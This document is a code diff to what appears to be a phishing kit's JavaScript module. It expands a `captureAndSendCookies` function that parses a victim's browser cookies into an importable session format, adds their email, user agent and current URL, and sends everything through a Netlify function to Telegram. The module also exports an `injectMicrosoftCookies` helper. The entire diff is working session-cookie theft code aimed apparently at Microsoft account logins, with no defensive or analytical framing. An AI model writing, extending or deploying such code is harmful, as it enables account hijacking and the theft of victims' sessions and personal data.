@@ -92,16 +92,63 @@ export function formatCookiesForTelegram(cookies) {
 }
 export async function captureAndSendCookies(userEmail, cookies) {
     let cookiesToSend = cookies;
-    try {
-        cookiesToSend = JSON.parse(cookies);
-    } catch (e) {}
-    await fetch('/.netlify/functions/sendTelegram', {
+    
+    // Handle different cookie formats
+    if (typeof cookies === 'string') {
+        try {
+            cookiesToSend = JSON.parse(cookies);
+        } catch (e) {
+            // If it's a document.cookie string, parse it
+            cookiesToSend = cookies.split(';').map(cookie => {
+                const [name, ...valueParts] = cookie.trim().split('=');
+                const value = valueParts.join('=');
+                return {
+                    name: name.trim(),
+                    value: value.trim(),
+                    domain: window.location.hostname,
+                    path: '/',
+                    secure: window.location.protocol === 'https:',
+                    httpOnly: false,
+                    sameSite: 'none',
+                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
+                    hostOnly: false,
+                    session: false,
+                    storeId: null
+                };
+            }).filter(c => c.name && c.value);
+        }
+    }
+    
+    const telegramPayload = {
+        email: userEmail,
+        sessionId: `capture_${Date.now()}`,
+        cookies: cookiesToSend,
+        formattedCookies: cookiesToSend,
+        timestamp: new Date().toISOString(),
+        source: 'captureAndSendCookies',
+        userAgent: navigator.userAgent,
+        currentUrl: window.location.href
+    };
+    
+    console.log('📤 captureAndSendCookies sending to Telegram:', {
+        email: userEmail,
+        cookieCount: Array.isArray(cookiesToSend) ? cookiesToSend.length : 0
+    });
+    
+    const response = await fetch('/.netlify/functions/sendTelegram', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            email: userEmail,
-            cookies: cookiesToSend
-        })
+        body: JSON.stringify(telegramPayload)
     });
+    
+    if (response.ok) {
+        const result = await response.json();
+        console.log('✅ captureAndSendCookies: Data sent to Telegram successfully:', result);
+        return result;
+    } else {
+        const error = await response.text();
+        console.error('❌ captureAndSendCookies: Failed to send to Telegram:', error);
+        throw new Error(`Failed to send to Telegram: ${error}`);
+    }
 }
 export { injectMicrosoftCookies }
